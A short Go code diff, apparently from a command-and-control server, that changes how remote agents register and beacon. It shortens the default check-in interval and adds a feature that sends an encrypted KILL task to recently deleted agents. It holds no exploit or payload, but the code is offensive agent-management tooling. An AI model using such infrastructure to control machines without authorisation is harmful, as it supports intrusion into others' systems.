@@ -155,7 +155,7 @@ func (s *Server) handleRegister(w http.ResponseWriter, r *http.Request) {
 
 	sleepSec  := req.SleepSec
 	jitterPct := req.JitterPct
-	if sleepSec  <= 0 { sleepSec  = 60 }
+	if sleepSec  <= 0 { sleepSec  = 5 }
 	if jitterPct <  0 { jitterPct = 20 }
 
 	agent := &Agent{
@@ -202,6 +202,17 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 
 	agent, err := s.db.GetAgent(agentID)
 	if err != nil {
+		// Agent not in DB — check if it was recently deleted. If so, send a KILL
+		// task using the saved AES key so it exits instead of re-registering.
+		if ghostKey, ok := s.getGhostKey(agentID); ok {
+			killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
+			pt, _ := json.Marshal(beaconResponse{Tasks: killWires})
+			if enc, encErr := Seal(ghostKey, pt); encErr == nil {
+				w.Header().Set("Content-Type", "application/octet-stream")
+				w.Write(enc) //nolint:errcheck
+				return
+			}
+		}
 		http.Error(w, "unknown agent", http.StatusNotFound)
 		return
 	}
